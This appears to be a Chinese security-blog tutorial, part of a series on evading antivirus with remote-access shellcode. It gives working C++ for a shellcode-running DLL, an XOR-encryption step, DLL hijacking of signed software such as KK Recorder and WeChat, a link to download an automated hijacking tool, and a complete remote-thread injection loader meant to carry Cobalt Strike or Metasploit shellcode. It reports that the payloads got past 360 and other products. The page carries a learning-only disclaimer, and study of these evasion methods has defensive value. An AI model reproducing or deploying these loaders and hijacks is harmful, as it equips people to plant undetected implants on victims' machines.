**郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！**

《远控免杀从入门到实践》系列文章目录：

> 1、[远控免杀从入门到实践 (1)基础篇](https://www.freebuf.com/articles/system/227461.html)
>
> 2、[远控免杀从入门到实践 (2)工具总结篇](https://www.freebuf.com/articles/system/227462.html)
>
> 3、[远控免杀从入门到实践
> (3)代码篇-C/C++](https://www.freebuf.com/articles/system/227463.html)
>
> 4、[远控免杀从入门到实践
> (4)代码篇-C#](https://www.freebuf.com/articles/system/227464.html)
>
> 5、[远控免杀从入门到实践 (5)代码篇-> Python](https://www.freebuf.com/articles/system/227466.html)
>
> 6、[远控免杀从入门到实践 (6)代码篇-> Powershell](https://www.freebuf.com/articles/system/227467.html)
>
> 7、[远控免杀从入门到实践 (7)代码篇-> Golang+Ruby](https://www.freebuf.com/articles/system/227468.html)
>
> 8、远控免杀从入门到实践（8）-shellcode免杀实践

## 前言

最近在研究shellcode的免杀技术，因本人以前主要是搞逆向的，shellcode免杀方面还是个小白，所以就想着去看一看我老师任晓珲写的《黑客免杀攻防》想从中寻找一些思路，但是也没有找到比较好实际运用的例子来进行实践。后来看了看卿先生的博客和拿破轮胎写的文章实践了一下里面的几种思路，感觉还挺有意思，特记录实践过程与大家分享一下，有写错的地方还请各位大佬斧正，当然啦，好的免杀方法一旦公布也就很快就不免杀了，网上搜索能得到的免杀方法也几乎都是炒冷饭，但是冷饭就没有营养可以汲取吗？所以说我们可以借鉴别人分享思路，发散思维打造自己的免杀方法。

## 一、直接生成可执行文件

目前网上有很多的自动生成免杀shellcode的工具，但是要知道杀毒软件检测某个免杀工具也是非常容易的，因为这些流行工具的指纹很容易被杀软公司搜集到然后加入特征库，这样就使得通过这个工具制作的shellcode免杀基本上就失灵了，工具就变得很容易过时，所以我们需要来自己制作免杀。

我们使用CS生成C语言形式的shellcode

![f80e8fa3-305b-4b1b-a809-298cbaf70608.jpg](https://image.3001.net/images/20200225/1582609327_5e54b3afd8e4a.jpg!small)

![39085d19-4ece-444e-8941-386c26850429.png](https://image.3001.net/images/20200225/1582609399_5e54b3f7b2140.png!small)

![6ef27bc2-7e5d-4096-8dfc-adfc5f39eada.jpg](https://image.3001.net/images/20200225/1582609459_5e54b43357ade.jpg!small)

用VS编写程序加载shellcode加载器直接生成木马程序可执行文件。

![99913d4a-6c87-4d75-994b-5dfabd3edb06.jpg](https://image.3001.net/images/20200225/1582609496_5e54b4584c19e.jpg!small)

关于shellcode的加载器编写方式大家可以参考这篇文章：<https://uknowsec.cn/posts/notes/shellcode%E5%8A%A0%E8%BD%BD%E6%80%BB%E7%BB%93.html>

生成可执行文件后使用360静态查杀结果如下，这样直接生成可执行文件的形式有时候也可以躲避一些杀软的查杀。

![4ecfb286-4fb6-48d2-a19c-3c72821f8428.jpg](https://image.3001.net/images/20200225/1582609534_5e54b47ec39ce.jpg!small)

点击我们直接生成的可执行文件，CS成功上线360未拦截（其余杀软请自行测试）。

![5fd1b6ed-c117-4de4-806b-b80f66ceb488.png](https://image.3001.net/images/20200225/1582609555_5e54b493528f1.png!small)

## 二、加密shellcode后生成可执行文件

但是这种直接生成可执行文件的免杀效果有时候还是不太够，我们可以把shellcode进行加密存储，然后在执行的时候再解密出来执行，免杀效果会好一些。首先，我们要挑选一种加密方式来加密我们的shellcode,因为加密的方式有很多种，我们可以对全部shellcode使用同一种加密，也可以对shellcode进行分段使用不同的加密手段加密再分段解密，当然也可以进行多次加密等。

以最简单的异或加密为例：我们拿到shellcode以后可以将shellcode以16进制文本的形式粘贴进010Editor，然后使用其自带的异或运算来异或加密shellcode。

![a44db08c-10b8-4fcb-8edf-30d17ef9b8ae.jpg](https://image.3001.net/images/20200225/1582609584_5e54b4b00a554.jpg!small)

![4816fdd8-cf1e-4b12-90e8-06c46e13f51c.jpg](https://image.3001.net/images/20200225/1582609618_5e54b4d2c6d08.jpg!small)

我们将异或加密过的shellcode(我异或的0x97)，粘贴进我们编写的代码中，然后在执行之前进行循环异或回来，因为异或过X的内容，再异或一下X就会还原回以前的内容。

![35a82b4b-1521-4ec7-8c36-fd8460177031.jpg](https://image.3001.net/images/20200225/1582609658_5e54b4fa0d8a1.jpg!small)

使用360进行静态查杀无毒，点击后CS可上线360未拦截。当然这只是很简单的一种加密方式，现在加密算法有很多，加密的方式也有很多，比如说base64加密，RCfour加密，或者说是自己写的加密方式等等，没有哪一种加密方式是最好的。只要是能够隐藏我们shellcode原本内容的都可以进行尝试。

## 三、dll劫持白加黑方式免杀

上面的方法可以过一些杀毒，但是例如火绒有时候就可以在恶意软件一启动就拦截，但是如果你的恶意软件添加了数字签名，并且已经列入白名单，杀毒软件是不会拦截的。因为买数字签名太贵，但是如果我们利用dll劫持，把有数字签名的文件劫持了，利用白加黑文件的形式就可以轻松的利用别人已经签名了的程序运行我们的木马。

### 3.1流程图

![8b106680-faec-4311-92f9-636cad35dedf.png](https://image.3001.net/images/20200225/1582609689_5e54b5193aa80.png!small)

### 3.2具体操作

我们使用VS新建一个执行shellcode的dll，这里我使用的是弹计算器的shellcode且没有进行加解密操作，大家可以自行替换为自己的shllcode，或者再进行shellcode加解密操作都可以。

我们需要注意三点:

> 1.执行shellcode的命令必须放在dll的主函数“DllMain”中
>
> 2.我们需要新建一个线程运行shellcode
>
> 3.必须要有一个导出函数，函数里面的内容随意编写，没有影响，只是作为一个引子而已。

dllmain中代码如下：

    
    
    // dllmain.cpp : 定义 DLL 应用程序的入口点。
    #include "stdafx.h"
    #include<windows.h>
    #include<iostream>
    HANDLE My_hThread = NULL;
    unsigned char shellcode[] = "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
    DWORD  WINAPI  ceshi(LPVOID pParameter)
    {
        __asm
        {
            mov eax, offset shellcode
            jmp eax
        }
        return 0;
    }
    BOOL APIENTRY DllMain( HMODULE hModule,
                           DWORD  ul_reason_for_call,
                           LPVOID lpReserved
                         )
    {
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH://初次调用dll时执行下面代码
        My_hThread = ::CreateThread(NULL, 0, &ceshi, 0, 0, 0);//新建线程
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
        }
        return TRUE;
    }
    extern"C" _declspec(dllexport) void test()
    {
        int a;
        a = 0;
    }
    

我们编译生成dll以后，使用lordPE
查看一下输出表中是否有test函数，如果有则说明我们编写的dll没毛病（关于PE文件各种表的功能大家自行百度搜索）。

![5d3bc2c3-17a1-4984-9752-5aa1fb324980.png](https://image.3001.net/images/20200225/1582609722_5e54b53a519cb.png!small)

接下来我们就要选择我们要劫持的dll了，例如我们要劫持KK录像机的libfontconfig-1.dll（尽量选择和主程序在同一目录的dll）。

![4e91e67e-7a61-4041-b536-e35ec01386a8.png](https://image.3001.net/images/20200225/1582609741_5e54b54dea0d9.png!small)

下一步我们要用到一个工具叫Stud_PE,大家可以自行下载，然后我们把libfontconfig-1.dll拖入，依次点击函数栏-》右键添加新的输入表-》dll选择-》选择函数-》选中我们导出的函数-》点击加入即可。

![3d90e371-9ed5-4dfd-b6d5-2d0e819fd6be.jpg](https://image.3001.net/images/20200225/1582609756_5e54b55cb311f.jpg!small)

然后我们把我们用VS生成的dll放到和我们刚才修改过的dll同目录下，运行KK录像机就可以了。

![ddda322a-894e-4ebc-967a-a5ae0d73e03f.jpg](https://image.3001.net/images/20200225/1582609778_5e54b57234cd0.jpg!small)

成功弹出计算器。PS（这里要提一句,白文件dll的选择一定要选择程序加载的dll,可以使用Procmon.exe来监控程序运行的时候都加载哪些dll）

![a3b3fa3b-86e0-4288-952b-0a5ef2701ca9.jpg](https://image.3001.net/images/20200225/1582609791_5e54b57f1a82e.jpg!small)

查杀效果如下图所示。

![8418f7d8-1d27-46c1-8f43-09ac44bf7936.jpg](https://image.3001.net/images/20200225/1582609814_5e54b59601bae.jpg!small)

![e0c7af8a-e32a-470a-9a7f-6471cb097ae8.jpg](https://image.3001.net/images/20200225/1582609828_5e54b5a404d10.jpg!small)

## 四、利用工具自动劫持

可能没有编程基础或者二进制知识的小伙伴们有点难懂前面的几篇文章，不过没有关系，现在已经有大佬搞出了自动化劫持的工具了，该工具不仅能劫持dll,还支持劫持exe。先介绍一下工具：

此注入工具是添加输入表进行IAT注入：

> 1：输入cs或者msf生成shellcode生成免杀dll文件
>
> 2：添加需要劫持的软件或者dll
>
> 3：劫持过后会在运行目录生成一个Dll和inf配置文件
>
> 4：需要把两个文件放在被劫持的软件同目录下才可运行

生成的DLL经过免杀处理，目前只能注入未加壳软件和dll，如果加壳可生成dll过后自行利用lordpe进行添加输入表。

PS：此工具使用易语言编写可能会有杀软报毒（杀软对易语言程序不太友好），可考虑在虚拟机里面使用。

### 4.1劫持微信演示

下面我使用微信来给大家做一下演示：

我们打开工具后在下图所示地方输入自己的shellcode

![3ac96419-b77b-4e6a-b1ef-e0d0051fbfe6.png](https://image.3001.net/images/20200225/1582609870_5e54b5cea1826.png!small)

随后我们点击生成dll

![371149ee-cb02-4c56-9ef7-8527f57c3b52.png](https://image.3001.net/images/20200225/1582609892_5e54b5e4a7e6c.png!small)

会在工具所在目录下面生成如下图2个文件。

![f82c7118-e90f-4ce7-bdf8-7a6d420e495c.jpg](https://image.3001.net/images/20200225/1582609907_5e54b5f35487c.jpg!small)

然后我们点击劫持文件，在点击浏览选择刚才我们生成的dll，然后点击选择文件选择微信的程序，点击注入到导入表即可。

![80ed12d8-06f4-4197-84b3-0d0edbcf2980.png](https://image.3001.net/images/20200225/1582609920_5e54b60087993.png!small)

程序会主动备份被劫持的程序，后缀为.exe~，如果想还原只需要去掉~即可。然后我们还需要将生成的那两个文件复制到被劫持程序的同目录内。

![b15a46ed-998d-48ba-a404-c72f06bf7db5.png](https://image.3001.net/images/20200225/1582609938_5e54b612aeb0a.png!small)

然后我们点击被劫持的微信即可运行shellcode。

![7197bf8a-773a-4e36-955c-2fb3e5d45b16.jpg](https://image.3001.net/images/20200225/1582609950_5e54b61e38da5.jpg!small)

工具下载网盘：链接：<https://pan.baidu.com/s/1w8T5vgfGnIBU2Gkpq1kogQ>

提取码：c29j

## 五、利用远程线程注入shellcode混淆免杀

远程线程注入是指一个进程在另一个进程中创建线程的技术，我们使用远程线程注入技术可实现shllcode的混淆免杀效果。

### 5.1详细操作

使用VS建立C语言控制台项目

![652ba91a-8326-4708-8896-832daf0ed612.png](https://image.3001.net/images/20200225/1582609976_5e54b638054f2.png!small)

在项目上右键属性-》将MFC的使用选为在静态库中使用MFC（这样可以保证在别人机器上也可以运行，不会受到缺少依赖库的限制），缺点是生成的文件较大。

![fb02b365-b87f-444e-a10f-134a9dff9473.png](https://image.3001.net/images/20200225/1582609991_5e54b647e0b1e.png!small)

然后将以下代码中的shellcode数组替换为自己CS生成的或MSF生成的上线shellcode。

    
    
    #include "stdafx.h"
    #include <Windows.h>
    #include<stdio.h>
    #include "iostream"
    //隐藏运行程序时的cmd窗口
    #pragma comment( linker, "/subsystem:windows /entry:mainCRTStartup" )
    using namespace std;
    
    //使用CS或msf生成的C语言格式的上线shellcode
    unsigned char shellcode[] = "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2...........";
    
    BOOL injection()
    {
        wchar_t Cappname[MAX_PATH] = { 0 };
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        LPVOID lpMalwareBaseAddr;
        LPVOID lpnewVictimBaseAddr;
        HANDLE hThread;
        DWORD dwExitCode;
        BOOL bRet = FALSE;
    
        //把基地址设置为自己shellcode数组的起始地址
        lpMalwareBaseAddr = shellcode;
    
        //获取系统路径，拼接字符串找到calc.exe的路径
        GetSystemDirectory(Cappname, MAX_PATH);
        _tcscat(Cappname, L"\\calc.exe");
    
        //打印注入提示
       // printf("被注入的程序名:%S\r\n", Cappname);
    
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(π, sizeof(pi));
    
        //创建calc.exe进程
        if (CreateProcess(Cappname, NULL, NULL, NULL,
            FALSE, CREATE_SUSPENDED//CREATE_SUSPENDED新进程的主线程会以暂停的状态被创建，直到调用ResumeThread函数被调用时才运行。
            , NULL, NULL, &si, π) == 0)
        {
            return bRet;
        }
        //在
        lpnewVictimBaseAddr = VirtualAllocEx(pi.hProcess
            , NULL, sizeof(shellcode) + 1, MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);
    
        if (lpnewVictimBaseAddr == NULL)
        {
            return bRet;
        }
        //远程线程注入过程
        WriteProcessMemory(pi.hProcess, lpnewVictimBaseAddr,
            (LPVOID)lpMalwareBaseAddr, sizeof(shellcode) + 1, NULL);
    
        hThread = CreateRemoteThread(pi.hProcess, 0, 0,
            (LPTHREAD_START_ROUTINE)lpnewVictimBaseAddr, NULL, 0, NULL);
    
        WaitForSingleObject(pi.hThread, INFINITE);
        GetExitCodeProcess(pi.hProcess, &dwExitCode);
        TerminateProcess(pi.hProcess, 0);
        return bRet;
    }
    
    void help(char* proc)
    {
       // printf("%s:创建进程并将shellcode写入进程内存\r\n", proc);
    }
    
    int main(int argc, char* argv[])
    {
        help(argv[0]);
        injection();
    }
    

编译生成运行以后会发现程序会自动在后台启动一个系统的calc.exe进程，调试结果如下图所示。

![fbcf6f13-3a8c-4b84-8253-d5477fe8edc2.jpg](https://image.3001.net/images/20200225/1582610011_5e54b65b75305.jpg!small)

同时CS端上线。

![49249fa6-8fba-4d9f-b0d3-6941a8878b94.png](https://image.3001.net/images/20200225/1582610038_5e54b67665e89.png!small)

我的电脑上面同时开着WD、火绒、360、腾讯等杀毒软件，只有火绒提示已阻止，但是观察CS端并未掉线。静态查杀也都没有报毒。

下为运行时动态查杀图：

![9805a707-9724-466d-b6ce-00329e4ec0df.png](https://image.3001.net/images/20200225/1582610050_5e54b682defc8.png!small)

此方法还可配合其他方式，比如前面提到的shellcode加密解密免杀等，免杀的手段千变万化，没有哪一种免杀是最好的，我们要学会搭配运用，根据对方的防护情况来布置自己的免杀方式，再次感谢卿先生博客和拿破轮胎提供的免杀思路。

## 六、参考资料

> 《那些shellcode免杀总结》：<https://www.cnblogs.com/-qing-/p/12234148.html#_lab2_1_1>
>
> 《shllcode免杀实战系列》：<https://mp.weixin.qq.com/s/iMiTMGQS4sdPIiqVdfppig>

 ***本文原创作者：雨夜RainyNight，本文属FreeBuf原创奖励计划，未经许可禁止转载**

